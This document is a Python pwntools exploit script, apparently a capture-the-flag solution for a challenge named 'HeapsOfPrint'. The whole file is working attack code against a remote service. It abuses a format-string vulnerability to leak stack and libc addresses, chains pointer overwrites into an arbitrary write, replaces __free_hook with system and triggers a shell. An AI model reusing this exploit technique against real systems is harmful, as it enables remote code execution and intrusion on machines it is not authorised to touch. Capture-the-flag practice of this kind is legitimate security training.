#!/usr/bin/python2
# Author: Sceptic
# Packages: pip install pwntools && pip install parse
# Timeout: 180 Seconds
# Interval: 8 Minutes
# Host: flatearth.fluxfingers.net
# Port: 1747

# Files: ./libc.so.6 in cwd
# The exploit has some stack alignment edge cases that require retries

from pwn import *
from sys import argv
from parse import parse

# The LSB of the return address we want to reach (the start of the do_this function)
RET_ADDR_LSB = "\xb3"
OFFSET_MAIN_TO_CALL_FREE = 0x970-0x906
INITIAL_FMT_OFFSET_ARGV = 14
OFFSET_SP_TO_SECOND_TAR = 10*8

interactive = False

""" Exploit plan
1. Use base pointer chain to override ret addr LSB -> jump to do_this
2. Use argv up the stack to modify argv[0] pointer, then use argv[0] to create arbitrary pointer on stack
3. Use arbitrary pointer on stack for arbitrary write
"""

libc = ELF("libc.so.6")
LIBC_START_MAIN_RET_OFFSET = 0xf0
OFFSET___LIBC_START_MAIN = libc.symbols["__libc_start_main"]
OFFSET_LIBC_START_MAIN_RET = OFFSET___LIBC_START_MAIN + LIBC_START_MAIN_RET_OFFSET
OFFSET___FREE_HOOK = libc.symbols["__free_hook"]
OFFSET_SYSTEM = libc.symbols["system"]

if len(argv) == 3:
    HOST = argv[1]
    PORT = int(argv[2])
else:
    HOST = "ubuntu"
    PORT = 4444

FMT_OFFSET_FIRST_BP = 6
FMT_OFFSET_SECOND_BP = 10

STACK_SHIFT_PER_RET = 24
FMT_SHIFT_PER_RET = STACK_SHIFT_PER_RET // 8
# Base address of stack is at OFFSET_LEAK_TO_SP
# At offset STACK_SIZE_FIRST from SP is the location of second base ptr
# At offset STACK_SIZE_FIRST+STACK_SIZE_SECOND from SP is the destination of second base ptr
# -> we have to change 
OFFSET_LEAK_TO_SP = -7 - 16
OFFSET_SP_TO_RET = 8

INITIAL_SP_TO_SECOND_TAR_OFFSET = 10*8

INITIAL_FMT_OFFSET_ARGV_0 = INITIAL_FMT_OFFSET_ARGV + 31
INITIAL_OFFSET_SP_TO_ARGV_0 = (INITIAL_FMT_OFFSET_ARGV_0-6)*8

INITIAL_FMT_OFFSET_libc_start_main_ret = INITIAL_FMT_OFFSET_ARGV+3
INITIAL_FMT_OFFSET_main = INITIAL_FMT_OFFSET_libc_start_main_ret + 4

BADCHARS = "\r\n \x09\x0b\x0d"
def assert_fmt(fmt):
    for c in BADCHARS:
        assert(c not in fmt)

def write_to_ptr_at_offset(offset, what, curr_offset, curr_n):
    pl = ""
    if len(what)!=1:
        assert(len(what) == 2)
        tar_val = u16(what)
        mod = 0x10000
        n_mod = "%hn"
    else:
        tar_val = u8(what)
        mod = 0x100
        n_mod = "%hhn"

    for _ in range(curr_offset, offset-1):
        pl += "%02hhx"
        curr_n+=2


    diff = (tar_val-curr_n)%mod
    if diff < 2:
        #print("[!] Warning: small diff logic triggered")
        diff+=mod
    inc_n = "%0{}hhx".format(diff)
    curr_n+=diff
    pl += inc_n + n_mod
    return offset+1, curr_n, pl

def override_initial_ret_addr(leak):
    assert(not leak<(OFFSET_LEAK_TO_SP+INITIAL_SP_TO_SECOND_TAR_OFFSET))
    ret_addr_loc_LSB = leak+OFFSET_LEAK_TO_SP+OFFSET_SP_TO_RET
    #print("Writing second rbp LSB: {:02x}".format(ret_addr_loc_LSB))
    pl = ""
    curr_offset, curr_n, add_pl = write_to_ptr_at_offset(FMT_OFFSET_FIRST_BP, chr(ret_addr_loc_LSB), 1, 0)
    pl += add_pl
    curr_offset, curr_n, add_pl = write_to_ptr_at_offset(FMT_OFFSET_SECOND_BP, RET_ADDR_LSB, curr_offset, curr_n)
    pl += add_pl
    return curr_n, curr_offset, pl

def override_ret_addr(stack_lsword, curr_n = 0, ret_addr_bytes=RET_ADDR_LSB):
    assert(stack_lsword>=0)
    #print("Writing second rbp LSW: {:04x}".format(stack_lsword))
    pl = ""
    _, curr_n, add_pl = write_to_ptr_at_offset(FMT_OFFSET_FIRST_BP, p16(stack_lsword), 1, curr_n)
    pl += add_pl
    _, curr_n, add_pl = write_to_ptr_at_offset(FMT_OFFSET_SECOND_BP, ret_addr_bytes, FMT_OFFSET_FIRST_BP+1, curr_n)
    pl += add_pl
    return FMT_OFFSET_SECOND_BP+1, curr_n, pl

def recv_leaked_byte(r):
    r.recvuntil("character is ")
    leak = ord(r.recv(1))
    r.recvuntil(" Is it?")
    return leak

def send_pl(r, pl, stack_lsb, add_fmt_offset):
    assert(len(pl)+2<1000)
    if interactive:
        print("Sending pl: {}".format(pl))
    assert_fmt(pl)
    recv_leaked_byte(r)
    #print("Sending pl: {}".format(pl))
    r.sendline(pl+"\2\n")
    answ = r.recvuntil("\2")[:-1]
    return stack_lsb-STACK_SHIFT_PER_RET, add_fmt_offset+(STACK_SHIFT_PER_RET//8), answ

def write_bytes(r, stack_lsword, add_fmt_offset, ptr_mod_offset, ptr_offset, ptr_lsw, what):
    assert(ptr_mod_offset+1<ptr_offset) # we need some modifier space between the two pointers
    #print("Write requested for fmt offsets: {}, {}, ptr_lsw: {:04x}, content: {}".format(ptr_mod_offset, ptr_offset, ptr_lsw, what.encode("hex")))
    pl = ""
    curr_offset, curr_n, add_pl = override_ret_addr(stack_lsword)
    pl += add_pl
    curr_offset, curr_n, add_pl = write_to_ptr_at_offset(ptr_offset+add_fmt_offset, what[0], curr_offset, curr_n)
    pl += add_pl
    stack_lsword, add_fmt_offset, answ = send_pl(r, pl, stack_lsword, add_fmt_offset)
    for c in what[1:]:
        ptr_lsw+=1
        pl = ""
        curr_offset, curr_n, add_pl = override_ret_addr(stack_lsword)
        pl+=add_pl
        if ptr_lsw & 0xff == 0:
            #print("[!] Warning: ptr_lsw & 0xff ==0 -> using 2 byte write")
            mod_ptr_write = p16(ptr_lsw)
        else:
            mod_ptr_write = p8(ptr_lsw&0xff)
        curr_offset, curr_n, add_pl = write_to_ptr_at_offset(ptr_mod_offset+add_fmt_offset, mod_ptr_write, curr_offset, curr_n)
        pl += add_pl
        curr_offset, curr_n, add_pl = write_to_ptr_at_offset(ptr_offset+add_fmt_offset, c, curr_offset, curr_n)
        pl += add_pl
        stack_lsword, add_fmt_offset, _ = send_pl(r, pl, stack_lsword, add_fmt_offset)    
    
    return stack_lsword, add_fmt_offset


MAX_TRIES = 15
for try_num in range(MAX_TRIES):
    with remote(HOST, PORT) as r:
        try:
            SEP_CHAR = '\1'
            # Leak different addresses we care about in first payload
            leak = recv_leaked_byte(r)
            curr_n, curr_offset, pl = override_initial_ret_addr(leak)
            while curr_offset<=INITIAL_FMT_OFFSET_ARGV:
                pl += "%016llx"
                curr_offset+=1
            pl+=SEP_CHAR

            while curr_offset<=INITIAL_FMT_OFFSET_libc_start_main_ret:
                pl += "%016llx"
                curr_offset+=1
            pl+=SEP_CHAR

            while curr_offset<=INITIAL_FMT_OFFSET_main:
                pl +="%016llx"
                curr_offset+=1
            pl+=SEP_CHAR

            while curr_offset<=INITIAL_FMT_OFFSET_ARGV_0:
                pl += "%016llx"
                curr_offset+=1
            pl+=SEP_CHAR

            #print("Got leak: {:02x}. Generated initial payload: {}".format(leak, pl))

            # Initially leak and get into loop
            if interactive:
                raw_input("go...")
            r.send(pl+"\n")

            answ = r.recvuntil(SEP_CHAR)[:-1]
            #print("Got answ: {}".format(answ))
            argv = int(answ[-16:], 16)
            sp = argv - INITIAL_OFFSET_SP_TO_ARGV_0
            libc_ret_addr = int(r.recvuntil(SEP_CHAR)[:-1][-16:], 16)
            libc_base = libc_ret_addr - OFFSET_LIBC_START_MAIN_RET
            free_hook = libc_base + OFFSET___FREE_HOOK
            system = libc_base + OFFSET_SYSTEM
            main = int(r.recvuntil(SEP_CHAR)[:-1][-16:], 16)
            call_free = main + OFFSET_MAIN_TO_CALL_FREE
            argv_0 = int(r.recvuntil(SEP_CHAR)[:-1][-16:], 16)

            if interactive:
                print("Got argv leak: {:016x}, sp: {:016x}, argv[0]: {:016x}, main: {:016x}\nGot __libc_start_main leak: {:016x}, libc_base: {:016x}".format(argv, sp, argv_0, main, libc_ret_addr, libc_base))
            assert((argv&0xffffffffffff0000)==(argv_0&0xffffffffffff0000))

            # Calc initial state of addresses according to leaks
            ret_addr_loc_LSW = ((sp + OFFSET_SP_TO_RET) & 0xffff)-STACK_SHIFT_PER_RET
            add_fmt_offset = STACK_SHIFT_PER_RET // 8
            arb_ptr_addr_lsw = (argv + 16) & 0xffff
            free_hook_lsw = free_hook & 0xffff
            call_free_lsw = call_free & 0xffff
            if interactive:
                print("Got arb_ptr_addr_lsw: {:04x}, __free_hook: {:016x}, system: {:016x}".format(arb_ptr_addr_lsw, free_hook,system))

            if interactive:
                raw_input("send argv[0] override pl...")
            # First prepare argv[0] to point to known, closer address (argv[0]+16)
            curr_offset, curr_n, pl = override_ret_addr(ret_addr_loc_LSW)
            _, __, add_pl = write_to_ptr_at_offset(INITIAL_FMT_OFFSET_ARGV+add_fmt_offset, p16(arb_ptr_addr_lsw), curr_offset, curr_n)
            pl += add_pl
            ret_addr_loc_LSW, add_fmt_offset, _ = send_pl(r, pl, ret_addr_loc_LSW, add_fmt_offset)

            if interactive:
                raw_input("send ptr write pl...")
            # Now write an arbitrary address to argv[0]+16 to be used for arbitrary write later
            ret_addr_loc_LSW, add_fmt_offset = write_bytes(r, ret_addr_loc_LSW, add_fmt_offset, INITIAL_FMT_OFFSET_ARGV, INITIAL_FMT_OFFSET_ARGV_0, arb_ptr_addr_lsw, p64(free_hook))

            if interactive:
                raw_input("reset argv[0] cursor...")
            curr_offset, curr_n, pl = override_ret_addr(ret_addr_loc_LSW)
            _, __, add_pl = write_to_ptr_at_offset(INITIAL_FMT_OFFSET_ARGV+add_fmt_offset, p16(arb_ptr_addr_lsw), curr_offset, curr_n)
            pl += add_pl
            ret_addr_loc_LSW, add_fmt_offset, _ = send_pl(r, pl, ret_addr_loc_LSW, add_fmt_offset)

            if interactive:
                raw_input("override free hook...")
            ret_addr_loc_LSW, add_fmt_offset = write_bytes(r, ret_addr_loc_LSW, add_fmt_offset, INITIAL_FMT_OFFSET_ARGV_0, INITIAL_FMT_OFFSET_ARGV_0+2, free_hook_lsw, p64(system))

            if interactive:
                raw_input("trigger free...")
            pl = "sh&&"
            _, __, add_pl = override_ret_addr(ret_addr_loc_LSW, curr_n=len(pl), ret_addr_bytes=p16(call_free_lsw))
            pl += add_pl
            send_pl(r, pl, ret_addr_loc_LSW, add_fmt_offset)

            CHALL = "HeapsOfPrint"
            r.clean(1)
            if interactive:
                r.interactive()
            else:
                r.sendline("ls")
                answ = r.recvuntil(CHALL, timeout=2)
                if CHALL in answ:
                    print("Success")
                    exit(0)
                else:
                    print("Fail")
                    exit(-1)
        except AssertionError:
            print("Got assertion error")
        except EOFError:
            print("Got EOF error")

print("Max attempts exhausted")
exit(-1)
